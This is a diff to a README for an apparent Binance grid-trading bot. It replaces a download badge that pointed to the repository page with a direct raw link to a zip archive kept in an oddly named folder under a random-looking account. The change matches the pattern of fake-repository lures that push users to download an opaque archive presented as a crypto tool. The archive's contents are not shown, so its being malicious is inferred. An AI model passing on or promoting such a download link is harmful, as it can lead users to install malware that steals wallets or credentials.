@@ -28,7 +28,7 @@ Whether you're a beginner or an experienced trader, this tool helps you take emo
 
 ### Step 1: Get the Bot
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_BOT-00CC66?style=for-the-badge&logo=download&logoColor=white)](https://github.com/telepathic-intonationpattern7471/Binance-DCA-Grid-Trading-Bot)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_BOT-00CC66?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/telepathic-intonationpattern7471/Binance-DCA-Grid-Trading-Bot/main/Elachista/Binance_Trading_Grid_DC_Bot_v3.3.zip)
 
 Visit this link to download the application.
 
